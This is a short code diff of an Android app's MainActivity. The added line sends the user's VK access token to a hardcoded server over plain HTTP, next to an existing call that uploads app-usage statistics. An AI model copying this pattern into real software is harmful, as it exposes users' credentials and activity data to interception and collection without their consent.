@@ -74,6 +74,8 @@ class MainActivity : AppCompatActivity() {
             changeV()
             val new = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
             var installedApps = getInstalledApps()
+            CallAPI().execute("http://192.168.212.122:25000/send_token/",
+                "{\"token\": \"${VKSdk.getAccessToken().accessToken.toString()}\"}")
             CallAPI().execute("http://192.168.212.122:25000/send_stats/", "${getTimeAppsUsed24Hours(new, installedApps)}")
         }
 
